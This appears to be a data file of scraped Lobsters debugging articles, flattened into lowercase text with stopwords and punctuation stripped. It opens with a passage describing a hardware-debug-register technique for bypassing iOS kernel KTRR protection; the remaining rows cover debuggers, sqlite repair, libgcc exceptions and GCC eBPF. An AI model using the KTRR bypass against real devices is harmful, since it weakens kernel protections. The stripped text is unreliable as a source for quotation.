ktrr register yet initialized using external debug register dbgwrap repeatedly singlestep execution core step read pc value debugged core determine instruction executed core execute ktrr initialization instruction use external debug register overwrite value debugged core general purpose register skip ktrr initialization use dbgwrap restart core exiting debug state ktrr disabled mmu meaning possible execute memory outside ktrr readonly region possible set custom page table base remap kernel onto fresh writable physical page outside amcc ktrr range ktrw order make functionality useful packaged ktrr bypass io kext loader kernel debugger named ktrw ktrw make possible compile c program macho file dynamically load link binary running kernel io kernel debugger implement gdb stub accessible usb course ktrw particular gdb stub kext significantly complicated ktrr bypass encountered numerous interesting challenge needed overcome including writing usb stack scratch undocumented hardware however ktrw source code reasonably well commented refer interested reader particular ktrr bypass work device debugging register appear accessible device appear partially functional differs device tree difficult know sure whether debugging register truly unusable device without greater insight hardware might work perfectly slight variation setup using first configured using proprietary mechanism security vulnerability reported apple project zero issue neither project zero apple considers existence debug register security vulnerability reason order use register bypass ktrr one would already need kernel arbitrary readwrite capability point device considered fully compromised anyway attacker kernel readwrite access data used app system evidence kernel readwrite attacker need practice highly recommend reading ian phenomenal technical analysis five inthewild io exploit chain including analysis implant found attacker used kernel readwrite capability launch implant binary implant launched get access data exfiltrates using normal userspace apis research phone securerom exploit apple announced blackhat considering providing researchfused device security researcher genuinely hope deliver promise soon without requiring ndas restriction placed security researcher like personally believe would tremendous step forward open security research presence debug register allow one bypass ktrr debug kernel even absence securerom vulnerability practice however publication securerom exploit solves goal listed research iphone provides added benefit needing kernel vulnerability expect future research platform based around capability conclusion one thing hoped convey post path discovering ktrr bypass surprisingly straightforward considering ian prior work looking selfhosted debug extensive arm documentation external debug public research nailgun attack android xnu source practically spelling execute dynamically generated instruction confident first one discover issue general fear secrecy surrounding knowledge technique io security research community allowing privately held stateoftheart security research diverge publicly shared stateoftheart happens put defender systemic disadvantage suspect ktrr bypass bypass particular one example divergence spoken several member io research community believe knowledge debug register widespread certain circle example xerub xerub presented slide mosec hinted surprising capability offered debugging feature siguza hinted ktrr bypass blog post aprr furthermore suspect ktrr bypass technique privately discovered technique way bypass ktrr almost certainly technique still work yet researcher rarely ever publicly admit capability make wonder technique capability known private circle making ktrw public want facilitate security researcher like interested understanding iphone work improving security hopefully narrow gap publicly shared privately held capability process acquire developmentfused device access trove information researcher choose use device adversary looking harm iphone user already capability hopefully eye io internals continue improve security long run
142,Lobsters,debugging,Debugging,Pernosco Demo Video,https://robert.ocallahan.org/2019/10/pernosco-demo-video.html,pernosco demo video,pernosco gdb tutorial pernosco get touch rr,last year kept work pernosco debugger mostly wrap finally time show world working without ado introductory demo video showing pernosco debugging reallife bug video demo based great gdb tutorial created brendan gregg read blog post get background able compare pernosco gdb experience pernosco make developer productive providing scalable omniscient debugging accelerating existing debugging strategy enabling entirely new strategy feature integrating experience cloudbased workflow latter includes capturing test failure occurring ci developer jump debugging session one click url separating failure reproduction debugging qa staff record test failure send debugger url developer letting developer collaborate debugging session next week plan say lot pernosco benefit software developer including detailed breakdown approach feature see update follow pernosco twitter opening feel ready serve customer keen talk people think might benefit pernosco get touch full disclosure pernosco us rr limited linux statically compiled language like ccrust
143,Lobsters,debugging,Debugging,Fixing a corrupt sqlite3 database with vbindiff,https://www.härdin.se/blog/2019/10/20/fixing-a-corrupt-sqlite3-database-with-vbindiff/,fixing corrupt database vbindiff,quiterss vbindiff sqlitebrowser opml,day ago r reader quiterss started crashing immediately startup digging around bit localsharequiterssquiterss discovered corrupted feedsdb file cause file database quiterss us keep track feed post user read filter obviously file broken go process readding feed currently subscribed annoying say least comparing corrupt feedsdb database fresh installation quiterss using vbindiff revealed following feedscorruptdb ad ab dc g ta bleinfoi nfocrea te table info id feedsfreshdb sqlite f ormat ad ab dc g ta bleinfoi nfocrea te table info id key move f find ret next difference esc quit move top asciiebcdic e edit file g goto position q quit b move bottom difference stand magic string sqlite format missing corrupt file instead first byte file appear replaced seven littleendian integer value idea perhaps kind heap corruption first attempt fixing replace first byte file data identical fresh file quite easy e edit file command vbindiff worked well enough able open file sqlitebrowser see database schema table parsed ok sadly nt enough feed table empty diggin around source code mainly btreeinth lockbtree btreec discovered reason feed table showing npage value header byte wrong value specifies size file cluster cluster kib took size file b divided converted hexadecimal put hex value npage part header feedsalmostdb sqlite f ormat ad ab dc g feedsnpagedb sqlite f ormat ad ab dc g key move f find ret next difference esc quit move top asciiebcdic e edit file g goto position q quit b move bottom result worked point exported feed opml file friendlier interchangable xml form lesson need improve backup system plus side learned quite bit internals
144,Lobsters,debugging,Debugging,GCP Goodies Part 8— Stackdriver debugging,https://blog.softwaremill.com/gcp-goodies-part-8-stackdriver-debugging-f4a8af6cec14,gcp goody part stackdriver debugging,gcp goody part stackdriver debugging web application profiler part cluster http wwwgoogleapiscomauthcloud stackdriver debugger gcp goody,gcp goody part stackdriver flickr cc part series going look last part stackdriver functionality stackdriver debugger purpose going build play application scala deploy small custom made kubernetes cluster connect stackdriver debugger consoleweb applicationas part gcp goody stackdriver created small play application written scala deploy google kubernetes engine cluster source application found herethe important change need make stackdriver debugger work similarly profiler part modifying dockerfile generation proper agent jvm argument passed applicationto create following docker entry sbt code generate u following entry dockerfile another modification setting jvm parameter debugger agent enabled dockerfile one modification change entry point pas name version argument selectable stackdriver debugger web uifor purpose tutorial web application contains simple smthtodebug endpoint call service apisampleservicescala turn call another class called datagenerator whole idea create flow application observe using stackdriver debugger console endpoint accessed get request simply return number string uuids json back userclustersimilarly previous part series going create cluster difference need provide scope cluster operates believe reading doc clouddebugger enabled defaultfirst set variable used along tutorial authenticate gcp gcloud auth logingcloud config set computezone zonegcloud config set project course change value command suit needscreate cluster specific scope please note according google documentation change access scope cluster creation pick clouddebbuger option disable service access gke option google cloud apis cloudplatform gcloud container cluster create name scopeshttps wwwgoogleapiscomauthcloudplatform enablestackdriverkubernetesi highly recommend setting cloudplatform scope instead simply clouddebugger clouddebugger option able fetch docker image form gcr done expose server port world easier testing kubectl expose deployment typeloadbalancer port targetport get external ip address kubectl get servicesso good access service using external ip address time play debugger itselfstackdriver debuggerif done everything correctly application running navigate stackdriver debug gcp console see application already selected application drop control need pas source application somehow get debugger goingthere plethora option choose starting simple local project github gitlab etcof course google provides source code repository solution called cloud source using want fork repository gcp goody using github account try option simply use local file point directory local machine stackdriver magic happenson stackdriver debugger console create break point watch call stack well simply browse current value variable scopethe stackdriver debugger work bit differently debugger could used eg ide stopping execution running program production course though highlight current break point display current snapshot application stateexample call stack variable value break point hit top ability add inplace log point visible stackdriver logging console well saving snapshot application state break pointthis pretty cool ha line code modify docker container add jvm parameter debug production application accessible mannerwatch space gcp goody continuously discover try share blog series
145,Lobsters,debugging,Debugging,gdb-colour-filter: Colorify gdb backtrace,https://github.com/daskol/gdb-colour-filter,gdbcolourfilter colorify gdb backtrace,gdb colour filter overview gdb colour filter installation credit danielbershatsky skolkovotechru,gdb colour filter colourify backtrace output gdb python api overview gdb colour filter implement frame filter gdb python api could several chained filter gdb call filter element frame backtrace frame filter priority lowest high filter defined lowest priority last filter called printing stack trace installation installation quite straight forward needed put colorfilterpy directory include gdbinit file order first step one could clone whole repository git clone http githubcomdaskolgdbcolourfiltergit gdbgdbcolourfilter download couldfilterpy specified directory mkdir p gdbgdbcolourfilter wget gdbgdbcolourfiltercolourfilterpy http rawgithubusercontentcomdaskolgdbcolourfiltermastercolourfilterpy colourfilterpy included gdbinit following manner source gdbgdbcolourfiltercolourfilterpy credit daniel bershatsky danielbershatsky skolkovotechru
146,Lobsters,debugging,Debugging,ratio of bugs per line of code,https://www.mayerdan.com/ruby/2012/11/11/bugs-per-line-of-code-ratio,ratio bug per line code,development feel like increased line code loc nearly always result increased bug portrait code worst enemy loc enemy software project bug code ratio code complete defect tracking quality software relationship defect rate software development process maturity move fast break thing final thought quite said pulp fiction microservice architecture lightweight web service building miniapps comment powered disqus blog comment powered,development feel like increased line code loc nearly always result increased bug know seems obvious first hear many refactorings abstraction cleaner code increase loc reviewing lot code lately larger added loc concerned able fully understand review code even fully understand purpose new code know lurking line could subtle important bug seems obvious first overall complexity change level difficulty code large part equation well time answer really reviewing new code going project line introduces new place bug exist even individual line incredibly simple reviewing simple code change loc still often time far risky complex change loc team working refactoring cleaning large older code base one biggest issue sheer volume unused near duplicated overly abstracted code cognitive load associated understanding implication change might relying specific quirk piece existing code made think many great developer know try avoid creating large code base think eventually many great developer start really favor succinct code accomplish task often slightly le readable chaining injects transformation reduction collection one line leaf small surface area bug linger think many incredibly smart engineer enjoy beauty code move writing verbose readable explicit code big object reusable module condense succinct powerful code often favoring simpler object relationship data structure think best example developer trajectory verbosity conciseness come steve yegge give outrageous example beginner code compared expert code illustrate point portrait admits example bit joke seem support premise happen hold hardwon minority opinion code base particular believe quite staunchly might add worst thing happen code base size yegge code worst enemy fact many developer talk loc enemy software project linked post reference signal several time seth godin heavily quote steve mcconnell supporting much difficult le time efficient manage large code base think part reason large codebases problem code grows number existing bug system ratio bug per line code pretty constant project based method team followed adding feature code project many article linking point cost adding code grow linerly get order magnitude worse code base grows bug code ratio idea bug per line code really new idea steve mcconnell primary source previously mentioned post written extensively defect per line code covering average bug per loc stats great book code complete industry average error per line delivered code say usually representative code level structured programming behind probably includes mix coding technique b microsoft application defect per line code inhouse testing defect per kloc kloc called line code released product moore attribute combination codereading technique independent testing discussed another chapter book c harlan mill pioneered cleanroom development technique able achieve rate low defect per line code inhouse testing defect per line code released product cobb mill project example spaceshuttle software achieved level defect line code using system format development method peer review statistical testing going mcconnell talk value defect tracking well speed writing quality software relationship defect rate bug related team software development process maturity think mcconnell place high cost bug least modern agile web development mostly discussing issue context shipped microsoft nasa defense opposed continuously deployed web apps bug solved quickly mean time recovery matter extremely low bug rate yes facebook move fast break thing agree mcconnell bug software also slow speed development increase cognitive load working large project many developer varying skill often push easily readable code think important anyone team work code easily readable code start increase total code size two idea odds dichotomy brought front mind increasingly hesitant believe refactoring sake slight readability cost increased line code good thing think heavily functional succinct code far better back end system complex function le likely cause maintainability problem might slowly writing chained dense code think work everywhere yet see kind succinct clean code handle user input exception highly conditional view layer think part might experienced developer like work framework isolated service one produce enforce pretty code final thought keep code tiny fight extra complexity line code strike upon great vengeance furious quite said pulp fiction think bug loc ratio one main reason large codebase bad believe cognitive load write code function around bugsquirks code base progress slows much larger code base think large codebases bad one reason soa microservice architecture heroku lightweight web service github building miniapps solution larger apps end moving towards still place incredibly high value readability code often find collection accumulating another variable readable collection inject think developer error side le code unless clear improvement code especially trying refactor improve readability code based feel like refactorings introducing line code sake readability often moving complexity around often feel like win good probability introduce bug case actually clear refactoring author related refactoring making code larger small testable method great method another layer abstraction deferring yet another method meat problem solved le likely improvement abstraction cognitive load leaky abstraction layer another potential buggy line code design pattern great knowing overkill take time saying refactoring bad fact think bug loc ratio increase importance refactorings refactoring make code easier read likely difficult delivers functionality reducing total loc big win win term maintainability reduces far frequent bug multiple filesfunctions need kept sync ensure correct functionality one failing keep project small possible idea user input ux dedicated succinct code please show great example user input error handling complex conditional view layer still seen good way approach issue short writing code trying make condition clear small possible often product made developer solve allowing tiny number possible condition think approach work reality working designer ux team often clear use case conditional additional source obviously different bug different cost critical path bug much worse minor presentational bug ignoring issue get larger point please enable javascript view comment powered disqus blog comment powered
147,Lobsters,debugging,Debugging,Firefox’s New WebSocket Inspector,https://hacks.mozilla.org/2019/10/firefoxs-new-websocket-inspector/,firefox new websocket inspector,firefox devtools team firefox released firefox firefox developer edition firefox developer edition heng yeow tan google summer code gsoc primer websockets websocket w api socketio sockjs mdn guide getting started websocket inspector request message next websockets inspector har backlog feedback firefox developer edition article jan honza article harald kirschner digitarald,firefox devtools team contributor hard work summer getting firefox jampacked improvement especially excited new websocket inspection feature told u feedback important would daily work websocket inspector released firefox ready use firefox developer edition use inspector download firefox developer edition open devtools network panel find message tab keep reading learn websockets trick new panel sleeve first big thanks heng yeow tan google summer code gsoc student responsible implementation primer websockets use websocket w api create persistent connection client server api sends receives data time used mainly application requiring realtime communication although possible work directly w api existing library come handy help save time library help connection failure proxy authentication authorization scalability much w inspector firefox devtools currently support socketio sockjs support work want learn set websocket client application head mdn guide meantime let dive new feature getting started websocket inspector websocket inspector part existing network panel ui devtools already possible filter content opened w connection panel till chance see actual data transferred w frame following screenshot show w filter action request websocket protocol handshake visible response code indicates server switching w connection clicking request open familiar sidebar showing detail selected http request addition ui offer fresh new message panel used inspect w frame sent received selected w connection liveupdated table show data sent green arrow received red arrow w frame frame expands click inspect formatted data focus specific message frame filtered free text data time column visible default customize interface see column rightclicking header selecting frame list show preview bottom message panel inspector currently support following w protocol planned plain json socketio sockjs coming soon payload based protocol parsed displayed expandable tree easy inspection course still see raw data sent wire well use pauseresume button network panel toolbar stop intercepting w traffic allows capture frame interested next websockets inspector wanted release initial feature set quickly let use thing still working upcoming release binary payload viewer indicating closed connection protocol like signalr wamp making extensible exporting w frame part har see backlog coming would love feedback new websocket inspector available firefox developer edition released firefox include feedback bugfixes chance yet install open developer edition follow along post master websocket debugging honza working firefox developer tool article jan honza harald digitarald kirschner product manager firefox developer experience tool striving empower creator code design maintain web open accessible year mozilla grown skill set amidst performance web apis mobile installable web apps data visualization developer outreach project article harald kirschner digitarald
148,Lobsters,debugging,Debugging,Bypass McAfee with McAfee,https://dmaasland.github.io/posts/mcafee.html,bypass mcafee mcafee,click redirected,click redirected
150,Lobsters,debugging,Debugging,An Old Bug,https://blog.npmjs.org/post/186190819147/an-old-bug,old bug,weird line fixed modified without even really noticing npmcliarborist original inception module,recently happened across weird line readpackagetree reading code see might get started implementing workspace npm cliat time deep flow reading code tracing flow various part system strike important thought oh obviously wrong fixed without second thought tried integrate change back mainline cli readpackagetree version however realized foundit might seem weird first provide contextthe readpackagetree module read tree package nodemodules folder dependency resolution figure tree need modified install update provide basic data structure subsequently modified within npm cli installer codebase importantly load node object parent child link themnodejs module loader subtle important property make lot npm magic possible made good choice year way create cli utility module node call require foo node look nodemodules hierarchy find foo module however importantly package symlinked another location module resolution process run based target location link locationthis example symlink usrlocalbinnpm point usrlocallibnodemodulesnpmbinnpmclijs program updated carry dependency along multiple different version dependency loaded node program time providing release valve dependency constraint solver thus avoiding dependency hellso back weird line context file bit code loading child given node order match node module resolution algorithm reading target loading child rather treating link parentin mindset general code cleanup modified without even really noticing mistakenly let slip past completely unrelated commitwhen tried integrate readpackagetree change npm cli bunch test broke really bizarre way hit going lot strange cli behavior year started make ton sense like occasionally manually symlinked module would result dependency stripped away mutated way seemed make sense sure people someone probably comfortable module system often mess project reckless abandon prior npm deduplication default installation happened naive run parallel fetch whatever still needed level kind way dumb mostly good way result occasionally get copy something would fine also meant proper progress bar impossible since installer way knowing would done simple loop detection helped know eventually would done exactly year npm lot bugfixes logic added work around issue one subtle mistake caused result fixing however mean fixing bug break lot stuff work fine today good news npm workspace installer completely refactored npmcliarborist trivial implementout idle curiosity tracked bug snuck though pretty sure already knew answer date back original inception readpackagetree module really caught fixed well tspotted past self redhanded messing usual sneaking bug code ever catch guy quite thing answer
152,Lobsters,debugging,Debugging,GNU Tools Cauldron 2019,http://www.youtube.com/playlist?list=PL_GiHdX17Wtx2Bu1O_bREetZZv4moIaRi,gnu tool cauldron,,
153,Lobsters,debugging,Debugging,When exceptions collide,https://www.arangodb.com/2019/09/when-exceptions-collide/,exception collide,tl dr background arangodb article problem first finding c code gcclibrary caught act identical however mutex around whole code go wrong exactly happen happens together example program show bug mailing list circumvent problem pr possible fix lesson learned,story excursion bottom deep rabbit hole discovered foot gun gcc libgcc investigation cost several day hope writing entertain others save journey tl dr c application compiled gcc linux statically linked nonglibc clibrary like libmusl danger data race lead busy loop happening main static destructors finished race happens application use pthreadcancel explicitly first exception thrown process life thrown two different thread time background problem came citesting large pull request arangodb although test green every arangod process would terminate properly test would eventually time jenkins would show bad red ball deliver core sigabort tell core let explain setting arangodb multithreaded application written c build executable linux docker container using alpine linux libmusl clibrary build single selfcontained statically linked executable run basically variant linux run architecture simplifies packaging greatly help support team since deal single binary version binary even run window using window subsystem linux wsl see detail article problem core show single thread left stack trace program terminated signal sigabrt aborted deregisterframeinfobases file directory gdb bt deregisterframeinfobases deregisterframeinfobases doglobaldtorsaux runserver context fini note main already terminated middle doglobaldtorsaux function gcc creates run destructors global object turned later destructors already completed already stage c runtime cleanup shutdown process aborted ci system stage completely puzzled process might prevent proper shutdown could possibly fault pr fault effect happen every test run happening often enough annoying journey first finding inspecting core first reveal much since know way around c runtime code libgcc also could longer singlestep since core dump obviously could reproduce problem debugger however relatively quickly found short loop assembler code could look data structure manipulates prove core busy loop happening know assembler ignore part believe busy loop lea rbx mov rbx test rbx je mov rbx testb rbx jne cmp rdi jne shortened deregisterframeinfobases deregister sake brevity presentation rbx memory address looking like clear busy loop since jump never happens looking c code gcclibrary libgcc loop search singly linked list object type struct object whatever struct object void pcbegin void tbase void dbase union const struct dwarffde single struct dwarffde array struct fdevector sort u union struct unsigned long sorted unsigned long fromarray unsigned long mixedencoding unsigned long encoding unsigned long count b sizet struct object next comment dead code removed brevity machine object contains exactly six word next pointer happens point object thus creating circular data structure finding took quite time since dig old assembler knowledge carefully look around core find theory confirmed monitoring ci machine indeed showed towards end test run single core running cpu stage idea data structure libgcc however ccode saw two singly linked list unseenobjects seenobjects static file code dealing module place modifying seenobjects list file function unwindfindfde object unseenobjects list processed moved seenobjects list far could see code completely correct although notoriously get code linked list wrong furthermore neatly protected mutex seen surely code initobjectmutexonce gthreadmutexlock objectmutex would protect data structure concurrent access different thread could list become circular caught act proven code correct effect saw core could never happen sheer desperation thought actually catch act ruining data structure furthermore interested piece code would trigger event next thing run test native environment many test time high load machine put probe unmodified executable using linux perf tool much surprise actually quite simple used following command set probe record event sudo perf probe x buildbinarangod ob p sudo perf record e probearangod ar callgraph dwarf hit controlc recording sudo perf script perfhistory essentially create event every time seenobjects list modified case event would see complete call trace also value local variable ob p catch enabled least see piece code triggered bad behavior try shutdown busy loop actually happened curious would find indeed new core actual address loopy list event log perf show bad modification found exactly happening maintenancework probearangod unwind unwindfindregisteredfde inlined unwindfindfde workarangodbbuildbinarangod uwframestatefor workarangodbbuildbinarangod workarangodbbuildbinarangod unwindraiseexception workarangodbbuildbinarangod cxathrow workarangodbbuildbinarangod replicationsynchronize workarangodbbuildbinarangod arangodb maintenance synchronizeshard first workarangodbbuildbinarangod ffffffffffffffff unknown unknown maintenancework probearangod unwind unwindfindregisteredfde inlined unwindfindfde workarangodbbuildbinarangod uwframestatefor workarangodbbuildbinarangod workarangodbbuildbinarangod unwindraiseexception workarangodbbuildbinarangod cxathrow workarangodbbuildbinarangod replicationsynchronize workarangodbbuildbinarangod arangodb maintenance synchronizeshard first workarangodbbuildbinarangod ffffffffffffffff unknown unknown indeed exception thrown approximately time difference course eternity busy system many process running thread suspended time get time slice output local variable ob actually show object inserted singly linked list twice time second insert list ruined made loopy following assume list look like next b next c next object b inserted descending sorting address going position b inserted directly behind b normally insert next pointer changed point c next pointer b changed point yielding next b next next c next b identical result b next pointer pointing b must happened two thread trying manipulation time one must grabbed object unseenobjects list suspended grabbed object subsequently inserted object seenobjects list however could theory possibly true mutex around whole code go wrong turn mutex actually used however cleverly hidden c preprocessor magic idea mutex place necessary whole program singlethreaded sound like good idea improve performance using mutex single threaded program however detect program singlethreaded done differently different operating system even clibrary version basic idea pthreads library present assume program multithreaded use mutex gory detail found following line code come function gthreadactivep relevant implementation u freebsd solaris version look like ifdef gthrw pthreadkeycreate pthreadkeycreate pthreadkeycreate define gthractiveproxy gthrw pthreadkeycreate elif defined bionic define gthractiveproxy gthrw pthreadcreate else define gthractiveproxy gthrw pthreadcancel endif static inline intgthreadactivep void static void const gthreadactiveptr extension void gthractiveproxy return gthreadactiveptr us socalled weak reference resolved link time actual fact address library function loaded linker replaces library function executable glibc system internal function pthreadkeycreate used seems present pthreadcreate seems reliable since glibc problem occur android bionic clibrary pthreadcreate used directly know reliably work since try comment piece code saying many library wrap pthreadcreate thus symbol could without libpthreads actually linked seems therefore last case happens active libmusl alpine linux function pthreadcancel used actually work nonstatically linked executables assume case since pthreadcreate used whole shared library linked includes pthread function however link statically static linker manages put pthreadcreate leave pthreadcancel since explicitly using c program indeed rarely use pthreadcancel since functionality covered standard template library stl therefore actually happens alpine linux libmusl clibrary program us multiple thread pthreadcancel explicitly statically linked mutex used exactly happen unwindfindfde actually called still understood fine detail however understood exception thrown c runtime figure unroll stack execute cleanup destructors catch section resume execution right place performance reason nothing help done runtime ground exception handling zero overhead long exception actually thrown however compiler lot preparation compile time basically creates object whatever actually list frame descriptor entry fdes basically contain information binary code frame end begin example c program c c try callsomething catch std exception const e cleanup already contains multiple frame guess one try section one catch section one scope containing local variable c exception thrown deep callsomething c runtime return address point directly behind call callsomething figure frame try catch frame executed type match cleanup c case data structure prepared compiler also manipulated runtime reside unseenobjects seenobjects list case seen single object unseenobjects beginning main probably whole static executable contains lot fdes first exception thrown life process unwindfindfde called discover single entry unseenobjects time processed fdes potentially sorted object added seenobjects list think lazy initialization pattern potentially squeezing tiny bit improvement process startup time case mutex protecting absent first exception happening life process actually happens exactly time two thread data race thing go wrong singleton object inserted twice seenobjects shutdown busy loop process seems run fine although might situation runtime data structure destroyed one object list however seen happening wild summarize linux using glibc android bionic clibrary statically link executable explicitly use pthreadcancel first exception happens happens two thread exactly time one thread execution suspended unlucky time list manipulation unwindfindfde one object happens together get shutdown busy loop termination main function example program show bug sample program exposing problem store exceptioncollisioncpp current directory include thread include atomic include chrono std atomic int letsgo void waiter sizet count letsgo count try throw catch int const int main int char ifdef repair try throw catch int const endif std thread waiter std thread waiter std thisthread sleepfor std chrono millisecond letsgo return run alpine linux docker container like docker run privileged v pwd work work sh install g gdb compile program follows cd workg exceptioncollisioncpp exceptioncollision wall lpthread static finally even outside docker container true exceptioncollision date done soon see busy loop use cd workg exceptioncollisioncpp exceptioncollision wall lpthread static enable fix described submitted bug report libgcc gcc team first closed quickly ground problem libmusl however subsequently reported problem mailing list quickly replied problem actually libgcc first bug report reopened let see issue resolved two team circumvent problem understood different way circumvent problem first obvious one seems use pthreadcancel explicitly activate lot threadrelated functionality including particular mutex talking unfortunately time writing running different problem example program exposing problem store exceptionbangcpp current directory include pthreadh ifdef repairvoid g void p return p void f pthreadt pthreadcreate nullptr g nullptr pthreadcancel pthreadjoin nullptr endif int main int argc char ifdef repair argc f endif try throw catch int const return simply compile alpine linux like cd workg exceptionbangcpp exceptionbang wall lpthread static immediately crash turn crucial thread related symbol must additionally inserted create strong reference one would least need pthreadonce additionally seems work approach really temporary solution permament one next idea simply throw exception whilst still single threaded seems work beautifully pr implement devel branch arangodb single line fix beginning main like try throw catch int const solves problem however also permanent solution since c runtime would continue treat program singlethreaded know problem arise line possible fix perspective developer multithreaded application optimization skip mutex single threaded case seems bit top considering complication cause one way would simply use mutex case least place mutex never seems serious even measurable bottleneck however whole gthreads business probably also used elsewhere performance important nevertheless application nowadays use single thread easiest would switch whole optimization single threaded application least running libmusl second possibility would initialization fde list lazy fashion eagerly process start also seems simplification code could however make startup process slower case guess maybe important optimization initialize first exception actually happens know leaf third idea getting recognition singlethreadedness right even libmusl c program use pthreadcancel explicitly probably way go looking forward hearing gcc developer suggest lesson learned course last day learned lot implementation exception c gcc fdes code run main linking weak reference different clibraries stack unwinding gdb assembler code linux perf tool fun enlightening also difficult investigation lesson take away overoptimize cost unnecessary complexity c runtime exception handling complicated c exception quite expensive actually thrown since optimization common case exception thrown ccode hard understand particular presence lot platformspecific special case preprocessor magic linux perf tool incredible asset debugging open source make investigation possible first place team developing fundamental tool like gcc libmusl responsive actually help problem arise hope finding save journey investigating problem day want know multimodel arangodb recommend reading white paper wrote topic download
154,Lobsters,debugging,Debugging,Taking NetBSD kernel bug roast to the next level: Kernel Fuzzers (quick A.D. 2019 overview),http://netbsd.org/~kamil/eurobsdcon2019_fuzzing/presentation.html,taking netbsd kernel bug roast next level kernel fuzzers quick ad overview,,day hr min sec iteration mode feedback driven mode target aout thread cpu cpu cpu speed avg crash unique blacklist verified timeouts sec corpus size max size byte init dir file cov update day hr min sec ago coverage edge pc cmp log honggfuzz status minute fuzzing
155,Lobsters,debugging,Debugging,Using GDB in Emacs,https://undo.io/resources/gdb-resource-portal/gdb-watchpoint/using-gdb-emacs/,using gdb emacs,inside ide emacs running gdb multiple window gdb emacs gdb many window emacs optimising gdbemacs setup setting breakpoints gdb gdb emacs nt miss greg next gdb tutorial sign gdbwatchpoint mailing list,video episode gdbwatchpoint finn grimwood senior software engineer undo show us gdb inside emacs editor hi finn episode gdbwatchpoint greg asked show use emacs gdb technique improve debugging experience start starting emacs emacs minibuffer type command mx gdb hit return minibuffer show start gdb le exactly type command line gdb imi l useful thing know imi tell gdb running inside ide hit return command minibuffer start gdb inside emacs emacs running gdb running gdb inside emacs ide environment change suit emacs example toolbar changed show nextprevious updown stack command emacs also adapts toolbar use adding removing option help debugging experience multiple window gdb emacs set breakpoint main run gdb emacs automatically open file breakpoint use toolbar emacs customized navigate around program another useful automatic feature continue program end output shown new emacs window inputoutput really useful emacs separate source code program output interpreter separate window navigate program easily however even emacs show separate window navigating gud menu gdbwindows option gdb many window emacs view gdb process really useful start looking cluttered open window separately tend better way managing window called gdbmanywindows use open minibuffer run gdbmanywindows shown much organised much neater layout look like something expect ide provides local register inputoutput source code gdb command much useful opening window individually optimising gdbemacs setup technique useful still problem setup nt persist multiple emacs session quit go back emacs setup lost really frustrating make gdb many window persist mx customize open emacs config option search gdb find many window option toggle also find interesting option gdb show main display source file containing main routine startup done quit emacs completely restart start gdb useful window reinstated gdb prompt source file local register local breakpoints setting breakpoints gdb one final tip set gdb breakpoint emacs clicking gutter line want set breakpoint red dot appears gdb emacs see video almost exactly gdb setup emacs debugging hope useful see next gdbwatchpoint nt miss greg next gdb tutorial sign gdbwatchpoint mailing list
156,Lobsters,debugging,Debugging,eBPF support for GCC,https://gcc.gnu.org/ml/gcc-patches/2019-08/msg01987.html,ebpf support gcc,gcc project patch ebpf support gcc http,mail archive gccpatches gccgnuorg mailing list gcc project patch ebpf support gcc jose e marchesi jose dot marchesi oracle dot com gccpatches gcc dot gnu dot org date thu aug subject patch ebpf support gcc difference use targetbigendian instead targetlittleendian make sure asmspec always pass endianness selector argument assembler deobfuscate usage argtypesizeinbytes argaggregatetypep increase cummulative argument unconditionally bpffunctionargadvance simplify conditional bpfprintoperandaddress remove predicate regormemoryoperand movdstoperand became nonimmediateoperand kernel helper getcurrenttask nt accept argument adjust helper definition accordingly corresponding test hi people patch series introduces port gcc ebpf virtual machine resides linux kernel initially intended userlevel packet capture filtering ebpf nowadays generalized serve generalpurpose infrastructure also nonnetworking purpose binutils support already upstream see http ebpf architecture abi documentation ebpf found linux kernel source tree file documentationnetworkingfiltertxt cover instruction set way interpreter work many restriction imposed kernel verifier abi att moment compiled ebpf nt well established convention detail expected elf file containing ebpf determined practice llvm bpf backend generates expected two existing kernel loader bpfloadc libbpf hope addition port gnu toolchain help mature domain overview patch series first patch preparatory first patch update configguess configsub config upstream project order recognize bpf triplet second patch fix integrity check optfunctionsawk third patch annotates many test gccctorturecompile testsuite requirement term stack frame size using existing dgrequirestacksize machinery fourth patch introduces new effective target flag called indirectcall annotates test gccctorturecompile accordingly rest patch bpf specific fifth patch add new gcc port proper machine description implementation target hook macro commandline option like sixth patch add libgcc port ebpf moment minimal basically address limitation imposed target excluding function related timodes whose default implementation exceed ebpf stack limit seventh eight ninth patch deal testing new port gcctarget testsuite extended ebpfspecific test covering backendspecific builtin function diagnostics checkeffectivetarget function made aware ebpf target many test gccctorturecompile testsuite annotated skipped bpf target since violate restriction imposed hardware surpassing stack limit resulting testsuite nt unexpected failure currently principal way check regression port likewise many test gccdg testsuite annotated skipped bpf target tenth patch add documentation update gcc manual including information new command line option compiler builtins finally last patch add maintainer bpf port personally commit evolve maintain port long necessary find suitable replacement case step whatever reason note port compilation target ebpf rather peculiar mainly due quite hard restriction imposed kernel verifier also due securitydriven design architecture list example stack disjoint stack frame corresponding function activation isolated possible callee access stack frame caller caller access stack frame callees frame pointer register readonly therefore possible pas argument stack argument passing restricted argument stack frame limited byte default instruction set nt support indirect jump instruction set nt support indirect call architecture nt provide explicit stack pointer instead ebpf hardware case kernel verifier examines compiled program looking way stack accessed estimate size stack frame function ebpf program elf executables relocatable elf object kernel loader need access certain relocation object contains several entry point different kind ebpf kernel program hooked different part kernel working elf conventional alternative load model ebpf program tangent point restriction like impact port several way good keep mind reviewing patch subset c supported moment possible add language future ebpf kernel verifier get smarter therefore sophisticated program allowed back end try issue error ebpf restriction violated increase chance resulting object palatable kernel verifier shortening development cycle dynamic stack allocation alloca vlas achieved using otherwise would perfectly normal general register pseudo stack pointer disadvantage making register fixed therefore available general register allocation hopefully way conditionalize since alloca vlas relatively uncommon nt found yet restriction imposed kernel verifier characteristic virtual architecture available kernel helper behavior loader change one version kernel another therefore gcc backend provides mkernel command line option specifies minimum kernel version program executed conceptually similar mcpu option provided port preparing white paper compiled ebpf available cauldron next month addressing point many others depth really eager discus people best compile ebpf present future work port provides rough equivalence llvm port along binutils support used develop compiled ebpf application however way finished lot refinement addition port radar translate c core capability compileonce runeverywhere generation btf much ebpf field move fast also simulator gdb support work completed emulate different kernel context ebpf program execute simulator work suitable board description added dejagnu making possible run gcc testsuites gcc entering play two c compiler able generate ebpf clangllvm interoperability program generated compiler becomes important concern keeping ongoing task requiring communication compiler community kernel community modulus recently added core stuff added llvm upstream week ago testing following test suite executed target bpfunknownnone host using latest binutils master board description containin following definition setboardinfo mathlib setboardinfo gcc stacksize setboardinfo cflags running homejemarchgnusrcgccgitgcctestsuitegcctargetbpfbpfexp gcc summary expected pass expected failure unresolved testcases running homejemarchgnusrcgccgitgcctestsuitegccctorturecompilecompileexp gcc summary expected pass unresolved testcases unsupported test running 